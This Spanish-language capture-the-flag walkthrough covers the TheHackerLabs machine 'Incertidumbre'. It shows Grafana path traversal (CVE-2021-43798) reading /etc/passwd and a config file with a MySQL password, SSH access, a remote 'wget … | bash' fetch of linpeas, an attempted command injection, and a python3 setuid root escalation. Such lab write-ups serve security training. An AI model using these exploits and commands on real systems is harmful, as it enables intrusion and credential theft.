---
title: "Incertidumbre - TheHackerLabs"
date: 2025-09-22
draft: false
slug: "THL-writeup-incertidumbre"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, nos enfocamos solo en la página web activa en el puerto 3000 que resulta ser el login de la plataforma Grafana. Analizamos su código fuente y obtenemos su versión, lo que nos permite buscar un Exploit que sea acorde a esta. Encontramos que la versión usada de Grafana es vulnerable a Directory Traversal y Arbitrary File Read (CVE-2021-43798), que afecta versiones de 8.0.0-beta1 a 8.3.0. Gracias al Exploit, logramos leer el archivo /etc/passwd y el archivo grafana.ini, siendo este último el que contiene las credenciales para ganar acceso al servicio MySQL. Entrando al MySQL, enumeramos la base de datos de Grafana y conseguimos la contraseña de un usuario de la máquina víctima, así logramos ganar acceso vía SSH. Dentro de la máquina, utilizamos la herramienta linpeas.sh para descubrir vulnerabilidades, descubriendo que el binario python3 tiene la capability CAP_SETUID. Usamos la guía de GTFOBins para encontrar una forma de escalar privilegios, siendo así que logramos convertirnos en Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "SSH", "MySQL", "Grafana", "Default Credentials", "Grafana 8.3.0 - Directory Traversal and Arbitrary File Read (CVE-2021-43798)", "CVE-2021-43798", "Directory Traversal", "Arbitrary File Read", "MySQL Enumeration", "Abuse of Capability CAP_SETUID On Python3 Binary", "Privesc - Abuse of Capability CAP_SETUID On Python3 Binary", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "Wappalizer"
  - "curl"
  - "grep"
  - "sort"
  - "searchsploit"
  - "python3"
  - "nano"
  - "mysql"
  - "ssh"
  - "cat"
  - "sudo"
  - "linpeas.sh"
  - "wget"
  - "getcap"
  - "GTFOBins"
links:
  - "https://github.com/advisories/GHSA-8pjx-jj86-j47p"
  - "https://www.exploit-db.com/exploits/50581"
  - "https://rootxsushant.medium.com/a-comprehensive-guide-for-pentesting-grafana-cfa09b2f1243"
  - "https://grafana.com/docs/grafana/latest/datasources/mysql/configuration/"
  - "https://grafana.com/docs/grafana/latest/datasources/mysql/query-editor/"
  - "https://github.com/peass-ng/PEASS-ng"
  - "https://gtfobins.github.io/gtfobins/python/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-incertidumbre/incertidumbre.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.100.130
PING 192.168.100.130 (192.168.100.130) 56(84) bytes of data.
64 bytes from 192.168.100.130: icmp_seq=1 ttl=64 time=9.71 ms
64 bytes from 192.168.100.130: icmp_seq=2 ttl=64 time=0.936 ms
64 bytes from 192.168.100.130: icmp_seq=3 ttl=64 time=0.846 ms
64 bytes from 192.168.100.130: icmp_seq=4 ttl=64 time=0.823 ms

--- 192.168.100.130 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 0.823/3.079/9.713/3.830 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.100.130 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 12:19 CST
Initiating ARP Ping Scan at 12:19
Scanning 192.168.100.130 [1 port]
Completed ARP Ping Scan at 12:19, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:19
Scanning 192.168.100.130 [65535 ports]
Discovered open port 80/tcp on 192.168.100.130
Discovered open port 3306/tcp on 192.168.100.130
Discovered open port 22/tcp on 192.168.100.130
Discovered open port 3000/tcp on 192.168.100.130
Completed SYN Stealth Scan at 12:20, 10.88s elapsed (65535 total ports)
Nmap scan report for 192.168.100.130
Host is up, received arp-response (0.00072s latency).
Scanned at 2025-09-22 12:19:53 CST for 11s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.15 seconds
           Raw packets sent: 76768 (3.378MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Tenemos 4 puertos abiertos, pero me da curiosidad que el **puerto 3306** esté abierto.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,3000,3306 192.168.100.130 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 12:20 CST
Nmap scan report for 192.168.100.130
Host is up (0.00068s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   3072 71:72:6f:9a:ba:7f:73:1d:bc:30:36:ee:9d:62:e8:88 (RSA)
|   256 cd:0b:5b:55:41:13:bc:1c:d1:27:81:77:ff:6d:33:15 (ECDSA)
|_  256 63:29:44:28:7d:5a:db:39:29:47:2f:a5:1d:17:fc:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41

|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 403 Forbidden
3000/tcp open  http    Grafana http

|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
3306/tcp open  mysql   MySQL 8.0.39-0ubuntu0.20.04.1

|_ssl-date: TLS randomness does not represent time
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.39-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsCompression, SwitchToSSLAfterHandshake, InteractiveClient, SupportsLoadDataLocal, Speaks41ProtocolOld, LongPassword, IgnoreSigpipes, Speaks41ProtocolNew, LongColumnFlag, FoundRows, DontAllowDatabaseTableColumn, SupportsTransactions, Support41Auth, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 	\x10xzu9		g>Z\x0D\x0C%\x0C\x10S_5q
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.39_Auto_Generated_Server_Certificate
| Not valid before: 2024-10-15T07:08:12
|_Not valid after:  2034-10-13T07:08:12
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

La página web activa en el **puerto 80** no parece estar funcionando correctamente. Esto es porque nos da el **código de estado 403**.

La página web activa en el **puerto 3000** muestra un login de la **plataforma Grafana**.

Y por último, el escaneo del **puerto 3306** que es del **servicio MySQL**, nos da bastante información como la versión, el uso de **certificado SSL**, etc.

Ya que no hay sentido de analizar la página web del **puerto 80**, vamos a analizar el login de la **plataforma Grafana**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Login Activo en el Puerto 3000 (Plataforma Grafana) {#Grafana}

Primero que nada, ¿Qué es la **plataforma Grafana**?

| **Plataforma Grafana** |
|:----------------------:|
| *Grafana es una plataforma de código abierto que permite conectar a diversas fuentes de datos, para así consultar, visualizar, analizar y generar alertas sobre métricas, registros y seguimientos en tiempo real. Su función principal es transformar datos complejos en cuadros de mando interactivos y fáciles de interpretar, lo que la hace útil para el monitoreo de infraestructuras de TI, aplicaciones y dispositivos de IoT. * |

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura1.png">
</p>

Pues sí, solamente es el login.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura2.png">
</p>

Hay varias tecnologías, pero no veo algo que nos ayude de momento.

Revisando a fondo el código fuente del login, podemos encontrar la versión usada de la **plataforma Grafana**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura3.png">
</p>

En caso de que esté habilitado el endpoint `/api/health`, podemos obtener la versión de **Grafana**:
```bash
curl -s "http://192.168.100.130:3000/api/health
{
  "commit": "d7f71e9eae",
  "database": "ok",
  "version": "8.2.0"
}
```

De igual forma podemos obtener la versión usando **curl** al login de **Grafana** y aplicando algunos filtros:
```bash
# Forma 1:
curl -s "http://192.168.100.130:3000/login" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | sort -u
8.2.0

# Forma 2:
curl -s "http://192.168.100.130:3000/login" | grep -oP '"version"\s*:\s*"\K[0-9]+\.[0-9]+\.[0-9]+'
8.2.0

# Forma 3:
curl -s "http://192.168.100.130:3000/login" | grep -oP 'Grafana v\K[0-9]+\.[0-9]+\.[0-9]+'
8.2.0
```
Ahora sabemos qué versión es.

Podemos buscar algún Exploit existente para esta versión.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Credenciales por Defecto de la Plataforma Grafana {#CredsDefect}

Algo que siempre es muy útil utilizar, son las credenciales por defecto que tiene X o Y tecnología.

Podemos investigar cuáles son esas credenciales para la **plataforma Grafana**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura4.png">
</p>

La tenemos, vamos a probarlas:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura5.png">
</p>

Funcionaron, pues parece que no ha sido configurado aún.

Démosle una nueva contraseña al **usuario admin**, pues esto nos dará acceso total a la plataforma:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura6.png">
</p>

Ya podemos ir al **Dashboard**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura7.png">
</p>

Aquí mismo, podemos ver la versión de **Grafana**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura8.png">
</p>

Por último, como vimos que está activo el **servicio MySQL**, es posible que podamos conectarnos a este servicio y enumerarlo.

Para hacerlo, nos vamos al botón **Configuration** y escogemos la opción **Data sources**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura9.png">
</p>

Ahora da clic en el botón **Add data source** (observa que abajo se ve la versión de **Grafana**):

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura10.png">
</p>

Buscamos el **servicio MySQL** y lo elegimos:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura11.png">
</p>

Y ya solamente llenamos los datos que nos pide:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura12.png">
</p>

Aunque de momento no tenemos las credenciales de acceso, puedes ocupar esta opción para enumerar el **servicio MySQL** más adelante.

### Probando Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read {#Exploit}

Busquemos un Exploit para la **versión 8.2.0 de Grafana** en la base de datos **Exploit-DB** de **Kali**:
```bash
searchsploit grafana
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path

|---|---|
Grafana 7.0.1 - Denial of Service (PoC)                                                                                                                     | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                 | multiple/webapps/50581.py
Grafana <=6.2.4 - HTML Injection                                                                                                                            | typescript/webapps/51073.txt

|---|---|
Shellcodes: No Results
```
Tenemos un Exploit que aplica **Directory Traversal**, aunque no es para la versión que necesitamos.

Vamos a copiarlo en nuestro directorio de trabajo:
```bash
searchsploit -m multiple/webapps/50581.py
  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50581
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50581.py
    Codes: CVE-2021-43798
 Verified: False
File Type: Python script, ASCII text executable

mv 50581.py GrafanaExploit.py
```

Si analizamos el contenido del Exploit, veremos que funciona para varias versiones:
```bash
nano GrafanaExploit.py
---
...
# Description: Grafana versions 8.0.0-beta1 through 8.3.0 is vulnerable to directory traversal, allowing access to local files.
```
Entonces, debe funcionar para la versión que nos estamos enfrentando.

Analizando un poco más, veremos que la vulnerabilidad existe dentro del endpoint `/public/plugins` más una lista de plugins que pueden aplicar esta vulnerabilidad:
```bash
plugin_list = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
...
url = args.host + '/public/plugins/' + choice(plugin_list) + '/../../../../../../../../../../../../..' + file_to_read
```
Además, solamente debemos darle la URL donde está desplegado **Grafana** y el archivo a leer.

Vamos a probarlo:
```bash
python3 GrafanaExploit.py -H http://192.168.100.130:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
grafana:x:115:120::/usr/share/grafana:/bin/false
cloud:x:1001:1001:,,,:/home/cloud:/bin/bash
```
Excelente, funcionó y podemos ver que existe un usuario llamado **cloud**.

De acuerdo con **ChatGPT**, existen 2 archivos críticos que pueden darnos información valiosa sobre **Grafana**. Estos son:
* Archivo `/etc/grafana/grafana.ini`: Este es el archivo de configuración de **Grafana**, puede contener credenciales de acceso (similar al **wp-config.php** de **WordPress**).
* Archivo `/var/lib/grafana/grafana.db`: Esta es la BD **sqlite** que puede contener usuarios, dashboards, tokens, a veces hashes, etc.

Primero, veamos si podemos leer el archivo **grafana.ini**:
```bash
python3 50581.py -H http://192.168.100.130:3000
Read file > /etc/grafana/grafana.ini                        
##################### Grafana Configuration Example #####################
#
# Everything has defaults so you only need to uncomment things you want to
# change
```
Ahí está, pero es muy largo el archivo.

Analizándolo bien, podemos encontrar las credenciales de acceso para el **servicio MySQL**:
```bash
#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
type = mysql
host = 127.0.0.1:3306
name = grafana_db
user = grafana
password = mxIn1{JnyiKP{48SqvzEpa6S2
```

Y también tenemos las credenciales por defecto para el login de **Grafana**:
```bash
#################################### Security ####################################
[security]
# disable creation of admin user on first start of grafana
;disable_initial_admin_creation = false

# default admin user, created on startup
;admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
;admin_password = admin

# used for signing
;secret_key = SW2YcwTIb9zpOOhoPsMm

# disable gravatar profile images
;disable_gravatar = false
```
Aunque para este momento, ya cambiamos las credenciales por defecto.

Vamos a enumerar el **servicio MySQL**.

### Enumeración del Servicio MySQL {#MySQL}

Vamos a conectarnos con el comando **mysql**:
```bash
mysql -h 192.168.100.130 -u grafana -p --skip-ssl
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
...
MySQL [(none)]>
```
Estamos dentro.

Veamos qué bases de datos existen:
```bash
MySQL [(none)]> show databases;
+--------------------+

| Database           |
+--------------------+

| grafana_db         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.003 sec)
```
Hay varias BDs.

Usemos la BD de **Grafana** y veamos sus tablas:
```bash
MySQL [(none)]> use grafana_db
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [grafana_db]> show tables;
+----------------------------+

| Tables_in_grafana_db       |
+----------------------------+

| alert                      |
| alert_configuration        |
...

| temp_user                  |
| test_data                  |
| user                       |
| user_auth                  |
| user_auth_token            |
| users                      |
+----------------------------+
45 rows in set (0.003 sec)
```
Tenemos una tabla llamada **users**.

Veamos su contenido:
```bash
MySQL [grafana_db]> select * from users;
+---------+--------------------------------+

| usuario | passwd                         |
+---------+--------------------------------+

| cloud   | ****************************** |
+---------+--------------------------------+
1 row in set (0.002 sec)
```
Tenemos la contraseña del **usuario cloud**.

Sabemos que existe dentro de la máquina víctima, por lo que es posible que sea su contraseña del **servicio SSH**.

Probémosla:
```bash
ssh cloud@192.168.100.130
cloud@192.168.100.130's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
...
Last login: Fri Oct 18 17:35:25 2024
cloud@TheHackersLabs-Incertidumbre:~$ whoami
cloud
```
Muy bien, estamos dentro.

Aquí encontraremos la flag del usuario:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ ls
time.sh  user.txt
cloud@TheHackersLabs-Incertidumbre:~$ cat user.txt
...
```

Antes de continuar, podemos hacer la enumeración del **servicio MySQL** desde **Grafana**, siendo que solo nos faltaban las credenciales para conectarnos a una BD.

Llena los datos:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura13.png">
</p>

Guarda los datos y dale clic al botón **Explore** para comenzar a utilizar queries:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura14.png">
</p>

Observa que ya hay una query por defecto, pero podemos modificarla dándole al botón **Edit query** y una vez que la editemos, podemos ejecutar la query con el botón **Run query**:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura15.png">
</p>

Ya sabemos que existe la tabla **users**, así que vamos a leer el contenido de esa tabla:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura16.png">
</p>

Y así, volvimos a obtener la contraseña del **usuario cloud**.

## Post Explotación {#Post}

### Enumeración de la Máquina Víctima y Escalando Privilegios con Capabilities SETUID de Python3 {#linEnum}

En el directorio de este usuario, vimos un script.

Vamos a leerlo:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ cat time.sh 
#!/bin/bash
echo "Introduce el día (DD):"
read day
echo "Introduce el mes (MM):"
read month
echo "Introduce el año (YYYY):"
read year
echo "Introduce la hora (HH - 24h):"
read hour
echo "Introduce los minutos (MM):"
read minutes

new_date="$year-$month-$day $hour:$minutes:00"
echo "La nueva fecha y hora será: $new_date"
echo "¿Deseas continuar y cambiar la fecha del sistema? (si/no):"
read confirm

if [ "$confirm" == "si" ]; then
    sudo /usr/local/bin/set_date.sh "$new_date"
    echo "Fecha y hora actualizadas a: $(date)"
else
    echo "Operación cancelada."
fi
```
Entiendo que el script cambia la fecha de la máquina con una que le indiquemos.

Pero si revisamos los privilegios de nuestro usuario, veremos que podemos usar como **Root** ese script llamado **set_date.sh**:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ sudo -l
sudo: unable to resolve host TheHackersLabs-Incertidumbre: Temporary failure in name resolution
Matching Defaults entries for cloud on TheHackersLabs-Incertidumbre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cloud may run the following commands on TheHackersLabs-Incertidumbre:
    (ALL) NOPASSWD: /usr/local/bin/set_date.sh
```

Lo malo es que no podemos modificar estos dos scripts y no podremos leer el script **set_date.sh**:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ ls -la time.sh 
-rwxr-xr-x 1 root root 575 oct 16  2024 time.sh
cloud@TheHackersLabs-Incertidumbre:~$ ls -la /usr/local/bin/set_date.sh
-rwx------ 1 root root 87 oct 16  2024 /usr/local/bin/set_date.sh
```

En mi caso, intenté inyectar comandos dentro del script **time.sh** para que el script **set_date.sh** los ejecute, pero no funcionó:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ ./time.sh 
Introduce el día (DD):
/bin/bash
Introduce el mes (MM):
u+s
Introduce el año (YYYY):
chmod
Introduce la hora (HH - 24h):

Introduce los minutos (MM):

La nueva fecha y hora será: chmod-u+s-/bin/bash ::00
¿Deseas continuar y cambiar la fecha del sistema? (si/no):
si
sudo: unable to resolve host TheHackersLabs-Incertidumbre: Temporary failure in name resolution
date: invalid date ‘chmod-u+s-/bin/bash ::00’
Fecha y hora actualizadas a: lun 22 sep 2025 00:03:41 UTC
```
Pienso que esto es un **Rabitt Hole**.

Por último, encontraremos un script en el directorio `/opt/scripts` que, si lo leemos, es un script que le da **permisos SUID** a la **Bash**:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ ls -la /opt/scripts
total 12
drwxr-xr-x 2 root  root  4096 oct 16  2024 .
drwxr-xr-x 3 root  root  4096 oct 16  2024 ..
-rwxr-xr-x 1 cloud cloud   20 oct 18  2024 move_logs.sh
cloud@TheHackersLabs-Incertidumbre:~$ cd /opt/scripts/
cloud@TheHackersLabs-Incertidumbre:~$ cat /opt/scripts/move_logs.sh 
chmod u+s /bin/bash
cloud@TheHackersLabs-Incertidumbre:/opt/scripts$ ./move_logs.sh 
chmod: changing permissions of '/bin/bash': Operation not permitted
```
El problema es que lo ejecuta el **usuario cloud**, por lo que este script no funcionará.

Entonces, ejecutemos **linpeas.sh** para saber a qué puede ser vulnerable la máquina.

Aquí puedes obtener **linpeas.sh**:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: linpeas.sh</a>

Puedes ejecutarlo de manera remota desde la máquina víctima.

Levanta un servidor con **Python3** en donde tengas el **linpeas.sh**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y desde la máquina víctima, ejecútalo con el comando **wget**:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ wget -qO- http://Tu_IP/linpeas.sh | bash
```

Si analizamos la respuesta, veremos que el binario **python3.8** tiene **capabilities SETUID**:
```bash
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities
══╣ Current shell capabilities
...
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1828/usr/bin/ping = cap_net_raw+ep
```

Podemos comprobarlo con el comando **getcap**:
```bash
root@TheHackersLabs-Incertidumbre:/root# getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
```

También podemos ver que otras **capabilities** tienen otros binarios:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/snap/core20/1828/usr/bin/ping = cap_net_raw+ep
```

Entonces, podemos buscar en la **guía de GTFOBins** una forma de escalar privilegios:
* <a href="https://gtfobins.github.io/gtfobins/python/" target="_blank">GTFOBins: python</a>

Usaremos el siguiente comando:

<p align="center">
<img src="/assets/images/THL-writeup-incertidumbre/Captura17.png">
</p>

Probémoslo:
```bash
cloud@TheHackersLabs-Incertidumbre:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@TheHackersLabs-Incertidumbre:~# whoami
root
```
Somos **Root**.

Obtengamos la última flag:
```bash
root@TheHackersLabs-Incertidumbre:~# cd /root
root@TheHackersLabs-Incertidumbre:/root# ls
grafana_8.2.0_amd64.deb  root.txt  snap
root@TheHackersLabs-Incertidumbre:/root# cat root.txt
...
```
Y con esto, terminamos la máquina.
